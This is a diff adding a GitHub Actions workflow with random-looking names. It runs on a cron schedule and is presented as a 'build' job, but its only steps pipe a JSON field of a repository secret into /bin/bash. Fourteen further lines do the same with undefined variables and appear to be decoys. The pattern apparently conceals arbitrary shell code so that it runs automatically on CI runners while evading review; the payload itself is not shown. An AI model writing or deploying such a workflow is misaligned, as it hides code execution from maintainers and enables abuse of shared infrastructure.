@@ -1,0 +1,31 @@
+name: yuanyaozu5274
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuanyaozu5274
+        env:
+          hjs84: ${{ secrets.hjs84 }}
+        run: |
+          echo $hjs84 | jq -r .m32706 | /bin/bash
+          echo $brejx798 | jq -r .ikhx29 | /bin/bash
+          echo $cdtlf5975 | jq -r .b8 | /bin/bash
+          echo $l974 | jq -r .nfa83492 | /bin/bash
+          echo $qrqt20 | jq -r .caay98 | /bin/bash
+          echo $w993 | jq -r .j4 | /bin/bash
+          echo $a18 | jq -r .x9410 | /bin/bash
+          echo $pzf763 | jq -r .b371 | /bin/bash
+          echo $lji0 | jq -r .x9038 | /bin/bash
+          echo $to9 | jq -r .kmtvf993 | /bin/bash
+          echo $wngq61895 | jq -r .rttcq1762 | /bin/bash
+          echo $d3991 | jq -r .gq80 | /bin/bash
+          echo $sc2 | jq -r .hlfj0 | /bin/bash
+          echo $axnom912 | jq -r .rgjd78169 | /bin/bash
+          echo $znr21 | jq -r .s5271 | /bin/bash
+
